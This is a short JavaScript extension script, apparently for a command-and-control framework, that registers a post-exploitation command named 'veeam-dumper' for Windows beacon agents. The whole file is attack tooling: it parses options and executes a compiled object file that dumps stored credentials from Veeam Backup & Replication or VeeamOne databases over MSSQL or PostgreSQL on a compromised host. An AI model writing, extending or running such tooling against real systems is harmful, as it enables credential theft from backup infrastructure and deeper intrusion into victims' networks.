var metadata = {
    name: "Postex-BOF",
    description: "Post-exploitation BOFs: veeam-dumper",
};

var cmd_veeam = ax.create_command(
    "veeam-dumper",
    "Dump credentials from a Veeam Backup & Replication or VeeamOne database (MSSQL/PSQL)",
    "veeam-dumper <auto|mssql|psql> [--dbname <name>] [--exepath <path>] [--debug] [--veeamone]"
);
cmd_veeam.addArgString("dbtype", true);
cmd_veeam.addArgFlagString("--dbname", "dbname", false, "Database name (auto-detected from registry if omitted)");
cmd_veeam.addArgFlagString("--exepath", "exepath", false, "Path to sqlcmd.exe or psql.exe (searched in PATH and common locations if omitted)");
cmd_veeam.addArgBool("--debug", "Enable verbose debug output", false);
cmd_veeam.addArgBool("--veeamone", "Target VeeamOne instead of VBR", false);
cmd_veeam.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let dbtype   = parsed_json["dbtype"]   || "auto";
    let dbname   = parsed_json["dbname"]   || "";
    let exepath  = parsed_json["exepath"]  || "";
    let debug    = parsed_json["--debug"]    ? 1 : 0;
    let veeamone = parsed_json["--veeamone"] ? 1 : 0;
    let bof_params = ax.bof_pack("wstr,wstr,wstr,int,int", [dbtype, dbname, exepath, debug, veeamone]);
    let bof_path = ax.script_dir() + "_bin/cs_veeam_dumper." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: veeam-dumper");
});

var group_postex = ax.create_commands_group("Postex-BOF", [cmd_veeam]);
ax.register_commands_group(group_postex, ["beacon"], ["windows"], []);
